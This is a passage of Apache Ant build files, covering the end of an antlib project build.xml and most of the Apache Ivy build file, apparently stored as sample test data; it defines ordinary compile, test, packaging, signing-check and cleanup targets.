      />
  </target>

  <target name="check-for-NOTICE">
    <available file="NOTICE" property="notice-present?"/>

    <fail unless="notice-present?">You must create a product specific
    NOTICE file based on common/NOTICE.template in the top level
    directory</fail>
  </target>

  <target name="antlib" depends="compile, check-for-NOTICE">
    <copy todir="${build.classes}">
      <fileset dir="src/main" includes="**/*.xml,**/*.properties"/>
    </copy>
    <jar destfile="${jarname}">
      <fileset dir="${build.classes}"/>
      <metainf file="NOTICE"/>
      <metainf file="${common.basedir}/LICENSE"/>
    </jar>
  </target>

  <target name="checksum-target-jar"
          description="checksum our jar" depends="antlib">
    <checksums>
      <file file="${target.jar}"/>
    </checksums>
  </target>
  
  <target name="determine-test-types">
    <condition property="skip-junit">
      <not>
        <available file="${src.junit}"/>
      </not>
    </condition>
    <condition property="skip-antunit">
      <not>
        <available file="${src.antunit}"/>
      </not>
    </condition>
  </target>

  <target name="setup-for-junit-tests" depends="setup,determine-test-types"
    unless="skip-junit">
    <available classname="junit.framework.TestCase" property="junit-present?"/>    
    <fail unless="junit-present?">The JUnit library is not present.</fail>
            
    <available classname="org.apache.tools.ant.BuildFileTest"
      property="testutil-present?"
      ignoresystemclasses="true"
      classpath="${ant-testutil.jar}"/>

    <fail unless="testutil-present?">Expected to find ant-testutil.jar
    in ${ant-testutil.jar}, please set the property ant-testutil.jar
    to the correct location.</fail>
  </target>

  <target name="setup-for-antunit-tests" depends="setup,determine-test-types"
    unless="skip-antunit">
    <available classname="org.apache.ant.antunit.AntUnit"
      property="antunit-present?"/>

    <fail unless="antunit-present?">The AntUnit Ant library is not present.</fail>
  </target>

  <target name="compile-tests" depends="setup-for-junit-tests, antlib, resolve"
    unless="skip-junit">
    <javac 
      srcdir="${src.junit}"
      destdir="${build.testclasses}"
      debug="${javac.debug}"
      source="${javac.test-source}"
      target="${javac.test-target}"
      >
      <classpath>
        <pathelement location="${jarname}"/>
        <pathelement location="${ant-testutil.jar}"/>
        <path refid="classpath.test"/>
      </classpath>
    </javac>
    <copy todir="${build.testclasses}">
      <fileset dir="${src.junit}" includes="**/*.xml,**/*.properties"/>
    </copy>
  </target>

  <target name="junit-test" depends="ready-to-test-with-junit,resolve"
    unless="skip-junit">
    <mkdir dir="${junit.report.dir}"/>
    <junit
      printsummary="false"
      haltonfailure="false"
      failureproperty="junit.tests.failed"
      filtertrace="false"
      fork="${junit.fork}"
      forkmode="${junit.forkmode}"
      includeantruntime="true"
      >
      <classpath>
        <pathelement location="${jarname}"/>
        <pathelement location="${ant-testutil.jar}"/>
        <pathelement location="${build.testclasses}"/>
        <path refid="classpath.test"/>
      </classpath>

      <batchtest todir="${junit.report.dir}">
        <fileset dir="${src.junit}"/>
      </batchtest>

      <formatter type="xml"/>
      <formatter type="plain" usefile="false"/>
    </junit>
  </target>

  <target name="antunit-test" depends="ready-to-test-with-antunit,resolve"
    unless="skip-antunit">
    <condition property="antunit.includes" value="${antunit.testcase}"
               else="**/test.xml,**/*-test.xml">
      <isset property="antunit.testcase" />
    </condition>

    <property name="antunit.excludes" value="" />

    <mkdir dir="${antunit.report.dir}" />
    <au:antunit xmlns:au="antlib:org.apache.ant.antunit"
      failOnError="false"
      errorProperty="antunit.tests.failed"
      >
      <fileset dir="${src.antunit}" includes="${antunit.includes}"
               excludes="${antunit.excludes}" />

      <au:xmllistener todir="${antunit.report.dir}" />
      <au:plainlistener/>
    </au:antunit>
  </target>

  <target name="test" depends="junit-test, antunit-test">
    <fail if="junit.tests.failed">At least one JUnit test has failed.</fail>
    <fail if="antunit.tests.failed">At least one AntUnit test has failed.</fail>
  </target>

  <target name="clean" depends="setup-properties">
    <delete dir="${build}"/>
    <delete dir="${dist.base}"/>
    <delete dir="${dist.name}"/>
    <delete dir="${bin.dist.dir}"/>
    <delete dir="${src.dist.dir}"/>
  </target>

  <target name="javadoc_check">
    <uptodate property="javadoc.notrequired"
              targetfile="${build.javadoc}/package-list">
      <srcfiles dir="src/main" includes="**/*.java,**/*.html"/>
    </uptodate>
  </target>

  <target name="javadoc" depends="setup-properties, javadoc_check"
          description="--> creates the API documentation"
          unless="javadoc.notrequired">
    <mkdir dir="${build.javadoc}"/>
    <javadoc useexternalfile="yes"
             maxmemory="1000M"	
             destdir="${build.javadoc}"
             version="true"
             locale="en"
             windowtitle="${artifact.name} API"
             doctitle="${artifact.name}"
             failonerror="true"
             additionalparam="${javadoc.additionalparam}"
             verbose="false">
      <packageset dir="src/main"/>
      <classpath>
        <path refid="classpath.compile"/>
        <fileset dir="${ant.home}/lib" includes="*.jar"/>
      </classpath>
      <tag name="todo" description="To do:" scope="all"/>
      <tag name="ant.task" enabled="false" description="Task:" scope="types"/>
      <tag name="ant.datatype" enabled="false" description="Data type:" scope="types"/>
      <tag name="ant.attribute" enabled="false" description="Attribute:" scope="types"/>
      <tag name="ant.attribute.group" enabled="false" description="Attribute group:" scope="types"/>
      <tag name="ant.element" enabled="false" description="Nested element:" scope="types"/>
    </javadoc>
  </target>

  <!--copy the target to the destination. Only allowed if the tests pass!-->

  <target name="install" depends="test">
    <copy file="${jarname}" todir="${ant.home}/lib"/>
  </target>  

  <import file="${common.basedir}/m2.xml"/>
  <import file="${common.basedir}/ivy.xml"/>

  <target name="src-dist" depends="m2-pom,ivy.xml"
    description="--> creates a source distribution">

    <mkdir dir="${src.dist.dir}"/>
    <defaultexcludes remove="**/.gitattributes"/>
    <defaultexcludes remove="**/.gitignore"/>
    <defaultexcludes remove="**/.gitmodules"/>
    <copy todir="${src.dist.dir}">
      <fileset dir=".">
        <include name=".gitattributes"/>
        <include name=".gitignore"/>
        <include name=".gitmodules"/>
        <include name="INSTALL"/>
        <include name="NOTICE"/>
        <include name="README"/>
        <include name="TODO"/>
        <include name="build.properties"/>
        <include name="build.xml"/>
        <include name="changes.xml"/>
        <include name="common/"/>
        <include name="contributors.xml"/>
        <include name="docs/"/>
        <include name="ivy.xml"/>
        <include name="prepare.xml"/>
        <include name="project-template.pom"/>
        <include name="src/"/>
        <include name="version.properties"/>
      </fileset>
      <fileset dir="common">
        <include name="LICENSE"/>
      </fileset>
      <fileset file="${target.pom}"/>
    </copy>
    <defaultexcludes default="true"/>

    <fixcrlf srcdir="${src.dist.dir}" eol="dos" includes="*.bat,*.cmd"/>
    <fixcrlf srcdir="${src.dist.dir}" eol="unix">
      <include name="**/*.sh"/>
      <include name="**/*.pl"/>
    </fixcrlf>
    <fixcrlf srcdir="${src.dist.dir}">
      <include name="**/*.java"/>
    </fixcrlf>

    <antcall target="create-readable-documents">
      <param name="dest.dir" value="${src.dist.dir}"/>
    </antcall>
  </target>

  <target name="bin-dist" depends="checksum-target-jar,m2-pom,ivy.xml,javadoc">
    <mkdir dir="${bin.dist.dir}"/>

    <copy todir="${bin.dist.dir}">
      <fileset dir=".">
        <include name="docs/"/>
        <include name="README"/>
        <include name="INSTALL"/>
        <include name="NOTICE"/>
        <include name="TODO"/>
        <include name="changes.xml"/>
        <include name="contributors.xml"/>
      </fileset>
      <fileset dir="common">
        <include name="LICENSE"/>
      </fileset>
      <fileset file="${jarname}*"/>
      <fileset file="${target.pom}"/>
    </copy>
    <copy todir="${bin.dist.dir}/javadoc">
      <fileset dir="${build.javadoc}"/>
    </copy>
    <copy todir="${bin.dist.dir}/" includeemptydirs="false">
      <fileset dir="src">
        <include name="etc/"/>
        <exclude name="etc/testcases/"/>
      </fileset>
    </copy>
    <antcall target="create-readable-documents">
      <param name="dest.dir" value="${bin.dist.dir}"/>
    </antcall>
  </target>

  <target name="distribution" description="creates a complete distribution"
    depends="ready-to-distribute">

    <mkdir dir="${dist.base.binaries}"/>
    <mkdir dir="${dist.base.source}"/>

    <!--delete dir="${java-repository.dir}"/-->
    <!--mkdir dir="${java-repository.dir}"/-->

    <delete dir="${dist.name}"/>
    <antcall target="bin-dist" inheritall="false">
      <param name="bin.dist.dir" value="${dist.name}"/>
    </antcall>

    <zip destfile="${dist.base.binaries}/${dist.name}-bin.zip">
      <zipfileset dir="${dist.name}/.." filemode="755">
        <include name="${dist.name}/bin/*.pl"/>
        <include name="${dist.name}/bin/*.py"/>
      </zipfileset>
      <fileset dir="${dist.name}/..">
        <include name="${dist.name}/**"/>
        <exclude name="${dist.name}/bin/*.pl"/>
        <exclude name="${dist.name}/bin/*.py"/>
      </fileset>
    </zip>
    <tar longfile="gnu"
      destfile="${dist.base.binaries}/${dist.name}-bin.tar">
      <tarfileset dir="${dist.name}/.." mode="755" username="ant" group="ant">
        <include name="${dist.name}/bin/*.pl"/>
        <include name="${dist.name}/bin/*.py"/>
      </tarfileset>
      <tarfileset dir="${dist.name}/.." username="ant" group="ant">
        <include name="${dist.name}/**"/>
        <exclude name="${dist.name}/bin/*.pl"/>
        <exclude name="${dist.name}/bin/*.py"/>
      </tarfileset>
    </tar>
    <gzip destfile="${dist.base.binaries}/${dist.name}-bin.tar.gz"
      src="${dist.base.binaries}/${dist.name}-bin.tar"/>
    <bzip2 destfile="${dist.base.binaries}/${dist.name}-bin.tar.bz2"
      src="${dist.base.binaries}/${dist.name}-bin.tar"/>
    <delete file="${dist.base.binaries}/${dist.name}-bin.tar"/>

    <!--copy todir="${java-repository.dir}">
      <fileset dir="${dist.name}/lib">
        <include name="ant*.jar"/>
      </fileset>
      <mapper type="glob" from="*.jar" to="*-${version}.jar"/>
    </copy>
    <checksums>
      <fileset dir="${java-repository.dir}" includes="*${version}.jar"/>
    </checksums-->

    <checksums>
      <fileset dir="${dist.base.binaries}/">
        <include name="**/*"/>
        <exclude name="**/*.asc"/>
        <exclude name="**/*.sha512"/>
      </fileset>
    </checksums>

    <delete dir="${dist.name}"/>
    <antcall target="src-dist" inheritall="false">
      <param name="src.dist.dir" value="${dist.name}"/>
    </antcall>

    <defaultexcludes remove="**/.gitattributes"/>
    <defaultexcludes remove="**/.gitignore"/>
    <defaultexcludes remove="**/.gitmodules"/>
    <zip destfile="${dist.base.source}/${dist.name}-src.zip">
      <fileset dir="${dist.name}/..">
        <include name="${dist.name}/**"/>
      </fileset>
    </zip>
    <tar longfile="gnu"
      destfile="${dist.base.source}/${dist.name}-src.tar">
      <tarfileset dir="${dist.name}/.." username="ant" group="ant">
        <include name="${dist.name}/**"/>
      </tarfileset>
    </tar>
    <defaultexcludes default="true"/>
    <gzip destfile="${dist.base.source}/${dist.name}-src.tar.gz"
      src="${dist.base.source}/${dist.name}-src.tar"/>
    <bzip2 destfile="${dist.base.source}/${dist.name}-src.tar.bz2"
      src="${dist.base.source}/${dist.name}-src.tar"/>
    <delete file="${dist.base.source}/${dist.name}-src.tar"/>
    <delete dir="${dist.name}"/>
    <checksums>
      <fileset dir="${dist.base.source}/">
        <include name="**/*"/>
        <exclude name="**/*.asc"/>
        <exclude name="**/*.sha512"/>
      </fileset>
    </checksums>
  </target>

  <target name="check-contributors">
    <available property="contributors.file.exists?"
      file="contributors.xml"/>
  </target>

  <target name="check-changes">
    <available property="changes.file.exists?"
      file="changes.xml"/>
  </target>

  <target name="style-contributors" depends="check-contributors"
    if="contributors.file.exists?">
    <xslt style="${common.basedir}/stylesheets/contributors.xsl" in="contributors.xml"
      out="${dest.dir}/CONTRIBUTORS"/>
  </target>

  <target name="style-changes" depends="check-changes"
    if="changes.file.exists?">
    <xslt style="${common.basedir}/stylesheets/changes2whatsnew.xsl" in="changes.xml"
      out="${dest.dir}/WHATSNEW"/>
    <xslt style="${common.basedir}/stylesheets/changes2readmehtml.xsl" in="changes.xml"
      out="${dest.dir}/README.html"/>
  </target>

  <target name="create-readable-documents"
    depends="style-contributors,style-changes"/>

  <!-- uploading of releases -->
  <import file="${common.basedir}/upload.xml"/>

  <target name="prepare-upload" depends="bin-dist">
    <property name="upload.dir"
              value="${build.javarepository}/org.apache.ant/${artifact.name}/${artifact.version}"/>
    <mkdir dir="${upload.dir}"/>
    <copy file="${jarname}" todir="${upload.dir}"/>
    <copy file="${target.pom}" todir="${upload.dir}"/>
    <copy file="${target.ivy.xml}" todir="${upload.dir}"/>
    <jar destfile="${upload.dir}/${artifact.stub}-sources.jar">
      <fileset dir="src/main"/>
      <metainf file="NOTICE"/>
      <metainf file="${common.basedir}/LICENSE"/>
    </jar>
    <jar destfile="${upload.dir}/${artifact.stub}-javadoc.jar">
      <fileset dir="${build.javadoc}"/>
      <metainf file="NOTICE"/>
      <metainf file="${common.basedir}/LICENSE"/>
    </jar>
  </target>

  <target name="check-sigs" depends="prepare-upload">
    <uptodate property="jar.sig.ok"
              srcfile="${upload.dir}/${artifact.stub}.jar"
              targetfile="${upload.dir}/${artifact.stub}.jar.asc"/>
    <uptodate property="pom.sig.ok"
              srcfile="${upload.dir}/${artifact.stub}.pom"
              targetfile="${upload.dir}/${artifact.stub}.pom.asc"/>
    <uptodate property="sources.sig.ok"
              srcfile="${upload.dir}/${artifact.stub}-sources.jar"
              targetfile="${upload.dir}/${artifact.stub}-sources.jar.asc"/>
    <uptodate property="javadoc.sig.ok"
              srcfile="${upload.dir}/${artifact.stub}-javadoc.jar"
              targetfile="${upload.dir}/${artifact.stub}-javadoc.jar.asc"/>
    <uptodate property="ivy.sig.ok"
              srcfile="${upload.dir}/${artifact.stub}-ivy.xml"
              targetfile="${upload.dir}/${artifact.stub}-ivy.xml.asc"/>
    <fail message="Your OpenPGP signature of the artifacts is too old or missing">
      <condition>
        <not>
          <and>
            <isset property="jar.sig.ok"/>
            <isset property="pom.sig.ok"/>
            <isset property="sources.sig.ok"/>
            <isset property="javadoc.sig.ok"/>
            <isset property="ivy.sig.ok"/>
          </and>
        </not>
      </condition>
    </fail>
  </target>

  <target name="upload" depends="check-sigs,perform-nexus-upload"/>

  <!-- "fat" binary distributions with dependencies -->
  <import file="${common.basedir}/fetch.xml"/>

  <target name="fat-distribution"
          description="creates a complete binary distribution with dependencies"
          depends="distribution,fetch-dependencies">

    <unzip src="${dist.base.binaries}/${dist.name}-bin.zip"
           dest="."/>

    <copy todir="${dist.name}">
      <fileset dir="${build.deps}"/>
    </copy>

    <zip destfile="${dist.base.binaries}/${dist.name}-bin-withdeps.zip">
      <zipfileset dir="${dist.name}/.." filemode="755">
        <include name="${dist.name}/bin/*.pl"/>
        <include name="${dist.name}/bin/*.py"/>
      </zipfileset>
      <fileset dir="${dist.name}/..">
        <include name="${dist.name}/**"/>
        <exclude name="${dist.name}/bin/*.pl"/>
        <exclude name="${dist.name}/bin/*.py"/>
      </fileset>
    </zip>
    <tar longfile="gnu"
      destfile="${dist.base.binaries}/${dist.name}-bin-withdeps.tar">
      <tarfileset dir="${dist.name}/.." mode="755" username="ant" group="ant">
        <include name="${dist.name}/bin/*.pl"/>
        <include name="${dist.name}/bin/*.py"/>
      </tarfileset>
      <tarfileset dir="${dist.name}/.." username="ant" group="ant">
        <include name="${dist.name}/**"/>
        <exclude name="${dist.name}/bin/*.pl"/>
        <exclude name="${dist.name}/bin/*.py"/>
      </tarfileset>
    </tar>
    <gzip destfile="${dist.base.binaries}/${dist.name}-bin-withdeps.tar.gz"
      src="${dist.base.binaries}/${dist.name}-bin-withdeps.tar"/>
    <bzip2 destfile="${dist.base.binaries}/${dist.name}-bin-withdeps.tar.bz2"
      src="${dist.base.binaries}/${dist.name}-bin-withdeps.tar"/>
    <delete file="${dist.base.binaries}/${dist.name}-bin-withdeps.tar"/>

    <checksums>
      <fileset dir="${dist.base.binaries}/">
        <include name="**/*-withdeps*"/>
        <exclude name="**/*.asc"/>
        <exclude name="**/*.sha512"/>
      </fileset>
    </checksums>

    <delete dir="${dist.name}"/>
  </target>
  
</project>
</file>

<file path="sample_data/test_files/small/ant/ant-ivy-build.xml">
<!--
   Licensed to the Apache Software Foundation (ASF) under one
   or more contributor license agreements.  See the NOTICE file
   distributed with this work for additional information
   regarding copyright ownership.  The ASF licenses this file
   to you under the Apache License, Version 2.0 (the
   "License"); you may not use this file except in compliance
   with the License.  You may obtain a copy of the License at

     https://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing,
   software distributed under the License is distributed on an
   "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
   KIND, either express or implied.  See the License for the
   specific language governing permissions and limitations
   under the License.
-->
<project name="ivy" default="test-report" xmlns:ivy="antlib:org.apache.ivy.ant">

    <property environment="env"/>
    <property file="version.properties"/>
    <property file="build.properties"/>

    <property name="final.name" value="ivy.jar"/>

    <target name="init-ivy-user-home" unless="ivy.use.local.home">
        <condition property="ivy.home" value="${env.IVY_HOME}">
            <isset property="env.IVY_HOME"/>
        </condition>
        <property name="ivy.home" value="${user.home}/.ivy2"/>
    </target>

    <target name="init-ivy-local-home" if="ivy.use.local.home">
        <property name="ivy.home" value="${basedir}/.ivy2"/>
    </target>

    <target name="init-ivy-home" depends="init-ivy-user-home,init-ivy-local-home"/>

    <target name="init-ivy" depends="compile-bootstrap,init-ivy-home">
        <taskdef resource="org/apache/ivy/ant/antlib.xml"
                 uri="antlib:org.apache.ivy.ant">
            <classpath>
                <pathelement location="${core.classes.build.dir}"/>
                <pathelement location="${bootstrap.classes.build.dir}"/>
            </classpath>
        </taskdef>

        <ivy:configure override="true"/>
    </target>

    <target name="install" depends="jar"
            description="build Ivy and install it in Ivy user home for builds using Ivy user home to load Ivy jar">
        <property name="ivy.jar.file" value="${ivy.home}/jars/ivy.jar"/>
        <copy file="${artifacts.build.dir}/jars/${final.name}" tofile="${ivy.jar.file}"/>
    </target>

    <target name="install-ant" depends="jar"
        description="build Ivy and install it in Ant home lib">
        <condition property="ant.home" value="${env.ANT_HOME}">
            <isset property="env.ANT_HOME"/>
        </condition>
        <fail unless="ant.home" message="ANT_HOME environment variable or ant.home property required"/>
        <copy file="${artifacts.build.dir}/jars/${final.name}" tofile="${ant.home}/lib/ivy.jar"/>
    </target>

    <!-- =================================================================
         PREPARATION, CLEANING AND FLAGS TASKS
         ================================================================= -->
    <target name="init">
        <path id="lib.classpath">
            <fileset dir="${lib.dir}">
                <include name="*.jar"/>
            </fileset>
        </path>
        <path id="build.bootstrap.classpath">
            <pathelement location="${core.classes.build.dir}"/>
        </path>
        <path id="build.ant.classpath">
            <pathelement location="${core.classes.build.dir}"/>
            <path refid="lib.classpath"/>
        </path>
        <path id="build.optional.classpath">
            <path refid="build.ant.classpath"/>
        </path>
        <path id="run.classpath">
            <pathelement location="${core.classes.build.dir}"/>
            <pathelement location="${ant.classes.build.dir}"/>
            <pathelement location="${optional.classes.build.dir}"/>
            <path refid="lib.classpath"/>
        </path>
        <path id="test.classpath">
            <fileset dir="${lib.dir}" />
            <pathelement location="${core.classes.build.dir}"/>
            <pathelement location="${ant.classes.build.dir}"/>
            <pathelement location="${optional.classes.build.dir}"/>
            <pathelement path="${test.build.dir}"/>
        </path>
        <path id="javadoc.test.classpath">
            <path refid="run.classpath"/>
            <pathelement path="${test.build.dir}"/>
        </path>
    </target>

    <target name="prepare" depends="init">
        <mkdir dir="${classes.build.dir}"/>
        <mkdir dir="${core.classes.build.dir}"/>
        <mkdir dir="${bootstrap.classes.build.dir}"/>
        <mkdir dir="${ant.classes.build.dir}"/>
        <mkdir dir="${optional.classes.build.dir}"/>
        <mkdir dir="${all.classes.build.dir}"/>
        <mkdir dir="${test.build.dir}"/>
        <mkdir dir="${artifacts.build.dir}"/>
        <mkdir dir="${test.report.dir}"/>
    </target>

    <target name="clean" description="delete all generated files keeping sources only">
        <delete dir="${classes.build.dir}"/>
        <delete dir="${test.build.dir}"/>
        <delete dir="${artifacts.build.dir}"/>
        <delete dir="${ivy.report.dir}"/>
        <delete dir="${test.report.dir}"/>
        <delete dir="${javadoc.build.dir}"/>
        <delete dir="${doc.build.dir}"/>
        <delete dir="${build.dir}"/>
    </target>

    <target name="clean-lib">
        <delete dir="${lib.dir}"/>
    </target>

    <target name="clean-ivy-cache" depends="init-ivy-home">
        <delete dir="${ivy.home}/cache"/>
    </target>

    <target name="clean-ivy-home" depends="init-ivy-home">
        <delete dir="${ivy.home}"/>
    </target>

    <target name="clean-examples" description="clean all examples">
        <subant target="clean" failonerror="false">
            <fileset dir="${example.dir}" includes="**/build.xml"/>
        </subant>
    </target>

    <target name="clean-all" depends="clean-examples,clean,clean-lib"/>

    <target name="/noresolve" description="use to skip dependency resolution">
        <property name="no.resolve" value="true"/>
    </target>

    <target name="/notest" description="use to skip tests">
        <property name="skip.test" value="true"/>
    </target>

    <target name="/nojavadoc" description="use to skip javadoc">
        <property name="skip.javadoc" value="true"/>
    </target>

    <target name="/localivy" description="use a local ivy home">
        <property name="ivy.use.local.home" value="true"/>
    </target>

    <target name="/offline" depends="/noresolve" description="use to indicate no internet connection is available">
        <property name="offline" value="true"/>
    </target>

    <target name="default-version">
        <tstamp>
            <format property="pubdate" pattern="yyyyMMddHHmmss"/>
        </tstamp>
        <property name="version.prefix" value="${target.ivy.version}-local-"/>
        <property name="build.version" value="${version.prefix}${pubdate}"/>
        <property name="bundle.version" value="${target.ivy.bundle.version}.${target.ivy.bundle.version.qualifier}${pubdate}"/>
    </target>

    <!-- =================================================================
         DEPENDENCY MNGT, COMPILATION AND JAR
         ================================================================= -->
    <target name="resolve" depends="init-ivy" unless="no.resolve">
        <ivy:retrieve conf="default,test" pattern="${lib.dir}/[artifact].[ext]" sync="yes"/>
    </target>

    <target name="compile-core" depends="prepare">
        <javac srcdir="${src.dir}"
               destdir="${core.classes.build.dir}"
               sourcepath=""
               source="${ivy.minimum.javaversion}"
               target="${ivy.minimum.javaversion}"
               debug="${debug.mode}"
               includeantruntime="no">
            <excludesfile name="ant.patterns"/>
            <excludesfile name="optional.patterns"/>
        </javac>
        <copy todir="${core.classes.build.dir}" includeEmptyDirs="false">
            <fileset dir="${src.dir}">
                <exclude name="**/*.java"/>
                <excludesfile name="ant.patterns"/>
                <excludesfile name="optional.patterns"/>
            </fileset>
        </copy>

        <!-- copy settings files for backward compatibility with ivyconf naming -->
        <copy file="${core.classes.build.dir}/org/apache/ivy/core/settings/ivysettings-local.xml"
            tofile="${core.classes.build.dir}/org/apache/ivy/core/settings/ivyconf-local.xml"/>
        <copy file="${core.classes.build.dir}/org/apache/ivy/core/settings/ivysettings-default-chain.xml"
            tofile="${core.classes.build.dir}/org/apache/ivy/core/settings/ivyconf-default-chain.xml"/>
        <copy file="${core.classes.build.dir}/org/apache/ivy/core/settings/ivysettings-main-chain.xml"
            tofile="${core.classes.build.dir}/org/apache/ivy/core/settings/ivyconf-main-chain.xml"/>
        <copy file="${core.classes.build.dir}/org/apache/ivy/core/settings/ivysettings-public.xml"
            tofile="${core.classes.build.dir}/org/apache/ivy/core/settings/ivyconf-public.xml"/>
        <copy file="${core.classes.build.dir}/org/apache/ivy/core/settings/ivysettings-shared.xml"
            tofile="${core.classes.build.dir}/org/apache/ivy/core/settings/ivyconf-shared.xml"/>
        <copy file="${core.classes.build.dir}/org/apache/ivy/core/settings/ivysettings.xml"
            tofile="${core.classes.build.dir}/org/apache/ivy/core/settings/ivyconf.xml"/>
    </target>

    <!-- Build the Ant tasks with the current Ant runtime -->
    <target name="compile-bootstrap" depends="compile-core">
        <javac srcdir="${src.dir}"
               destdir="${bootstrap.classes.build.dir}"
               sourcepath=""
               classpathref="build.bootstrap.classpath"
               source="${ivy.minimum.javaversion}"
               target="${ivy.minimum.javaversion}"
               debug="${debug.mode}"
               includeantruntime="yes">
            <includesfile name="ant.patterns"/>
        </javac>
        <copy todir="${bootstrap.classes.build.dir}" includeEmptyDirs="false">
            <fileset dir="${src.dir}">
                <includesfile name="ant.patterns"/>
                <exclude name="**/*.java"/>
            </fileset>
        </copy>
    </target>

    <!-- Build the Ant tasks with the minimal Ant runtime -->
    <target name="compile-ant" depends="compile-core,resolve">
        <javac srcdir="${src.dir}"
               destdir="${ant.classes.build.dir}"
               sourcepath=""
               classpathref="build.ant.classpath"
               source="${ivy.minimum.javaversion}"
               target="${ivy.minimum.javaversion}"
               debug="${debug.mode}"
               includeantruntime="no">
            <includesfile name="ant.patterns"/>
        </javac>
        <copy todir="${ant.classes.build.dir}" includeEmptyDirs="false">
            <fileset dir="${src.dir}">
                <includesfile name="ant.patterns"/>
                <exclude name="**/*.java"/>
            </fileset>
        </copy>
    </target>

    <target name="compile-optional" depends="compile-ant">
        <javac srcdir="${src.dir}"
               destdir="${optional.classes.build.dir}"
               sourcepath=""
               classpathref="build.optional.classpath"
               source="${ivy.minimum.javaversion}"
               target="${ivy.minimum.javaversion}"
               debug="${debug.mode}"
               includeantruntime="no">
            <includesfile name="optional.patterns"/>
            <includesfile name="ant.patterns"/>
        </javac>
        <copy todir="${core.classes.build.dir}" includeEmptyDirs="false">
            <fileset dir="${src.dir}">
                <includesfile name="optional.patterns"/>
                <exclude name="**/*.java"/>
            </fileset>
        </copy>
    </target>

    <!-- =================================================================
         Create the two jar files (Ivy core and Ivy core + Ant tasks)
         ================================================================= -->
    <target name="jar" depends="compile-optional,default-version" description="Create Jar files">
        <!-- identify compiled ivy version -->
        <echo message="version=${build.version}${line.separator}" file="${core.classes.build.dir}/module.properties" append="true"/>
        <echo message="date=${pubdate}${line.separator}" file="${core.classes.build.dir}/module.properties" append="true"/>

        <mkdir dir="${artifacts.build.dir}/jars/"/>

        <!--
            there is a default Bundle-Version attribute in the source MANIFEST, used to ease
            development in eclipse.
            We remove this line to make sure we get the Bundle-Version as set in the jar task
        -->
        <copy file="${basedir}/META-INF/MANIFEST.MF" tofile="${artifacts.build.dir}/MANIFEST.MF">
            <filterchain>
                <replaceregex pattern="Bundle-Version:.*" replace="Bundle-Version: ${bundle.version}" byline="true"/>
            </filterchain>
        </copy>

        <copy todir="${all.classes.build.dir}">
            <fileset dir="${core.classes.build.dir}"/>
            <fileset dir="${ant.classes.build.dir}"/>
            <fileset dir="${optional.classes.build.dir}"/>
        </copy>

        <jar destfile="${artifacts.build.dir}/jars/${final.name}"
             manifest="${artifacts.build.dir}/MANIFEST.MF">
            <metainf dir="${basedir}" includes="LICENSE,NOTICE"/>
            <manifest>
                <attribute name="Specification-Title" value="Apache Ivy with Ant tasks"/>
                <attribute name="Specification-Version" value="${build.version}"/>
                <attribute name="Specification-Vendor" value="Apache Software Foundation"/>
                <attribute name="Implementation-Title" value="org.apache.ivy"/>
                <attribute name="Implementation-Version" value="${build.version}"/>
                <attribute name="Implementation-Vendor" value="Apache Software Foundation"/>
                <attribute name="Implementation-Vendor-Id" value="org.apache"/>
                <attribute name="Extension-name" value="org.apache.ivy"/>
                <attribute name="Build-Version" value="${build.version}"/>
            </manifest>
            <fileset dir="${all.classes.build.dir}"/>
        </jar>
        <!-- copy main jar to ease its use as an OSGi bundle -->
        <copy file="${artifacts.build.dir}/jars/${final.name}"
              tofile="${artifacts.build.dir}/org.apache.ivy_${bundle.version}.jar"/>

        <!-- clean generated module properties file -->
        <delete file="${core.classes.build.dir}/module.properties"/>
    </target>

    <!-- =================================================================
         PUBLISH LOCAL
         ================================================================= -->
    <target name="fixcrlf">
        <property name="eol.native.includes"
                  value="**/*.html,**/*.json,**/*.java,**/*.xml,**/*.txt,**/*.MF,**/*.properties,**/*.patterns,**/*.pom,**/*.xsl,**/*.css"/>
        <property name="eol.native.excludes"
                  value="build/**,bin/**,lib/**"/>

        <fileset id="eol.native.fileset"
                 dir="${basedir}"
                 includes="${eol.native.includes}"
                 excludes="${eol.native.excludes}"/>

        <fixcrlf srcdir="${basedir}"
                 includes="${eol.native.includes}"
                 excludes="${eol.native.excludes}"/>
    </target>

    <target name="sources" depends="default-version" description="Create source archive files">
        <mkdir dir="${artifacts.build.dir}/sources/"/>
        <jar destfile="${artifacts.build.dir}/sources/${final.name}">
            <metainf dir="${basedir}" includes="LICENSE,NOTICE"/>
            <manifest>
                <attribute name="Specification-Title" value="Apache Ivy Sources"/>
                <attribute name="Specification-Version" value="${build.version}"/>
                <attribute name="Specification-Vendor" value="Apache Software Foundation"/>
            </manifest>
            <fileset dir="${src.dir}"/>
        </jar>
    </target>

    <target name="publish-local" depends="jar,sources" description="publishes Ivy to Ivy local repository">
        <ivy:publish resolver="local" pubrevision="${build.version}"
            artifactsPattern="${artifacts.build.dir}/[type]s/[artifact].[ext]"
            forcedeliver="true"/>
    </target>

    <!-- =================================================================
         TESTS
         ================================================================= -->
    <target name="build-test" depends="jar">
        <javac srcdir="${test.dir}"
               destdir="${test.build.dir}"
               classpathref="run.classpath"
               source="${ivy.minimum.javaversion}"
               target="${ivy.minimum.javaversion}"
               debug="${debug.mode}"
               encoding="UTF-8"
               includeantruntime="no"/>
        <copy todir="${test.build.dir}">
            <fileset dir="${test.dir}">
                <exclude name="**/*.java"/>
            </fileset>
        </copy>
    </target>

    <target name="build-custom-resolver-jar" depends="jar">
        <mkdir dir="${build.dir}/custom-classpath"/>
        <javac srcdir="${basedir}/test/custom-classpath"
               destdir="${build.dir}/custom-classpath"
               classpathref="run.classpath"
               source="${ivy.minimum.javaversion}"
               target="${ivy.minimum.javaversion}"
               debug="${debug.mode}"
               includeantruntime="no"/>
        <jar destfile="${test.dir}/org/apache/ivy/core/settings/custom-resolver.jar"
             basedir="${build.dir}/custom-classpath"/>
    </target>

    <target name="init-tests-offline" if="offline">
            <fileset id="test.fileset" dir="${test.dir}">
                <include name="**/${test.class.pattern}.java"/>
                <exclude name="**/Abstract*Test.java"/>
                <not><contains text="remote.test"/></not>
            </fileset>
    </target>

    <target name="init-tests-online" unless="offline">
            <fileset id="test.fileset" dir="${test.dir}">
                <include name="**/${test.class.pattern}.java"/>
                <exclude name="**/Abstract*Test.java"/>
            </fileset>
    </target>

    <target name="init-tests" depends="init-tests-offline,init-tests-online"/>

    <target name="prepare-osgi-tests" depends="resolve" unless="skip.test">
        <ant dir="${basedir}/test/test-repo" target="generate-bundles"/>
    </target>

    <target name="prepare-test-jar-repositories" unless="skip.test">
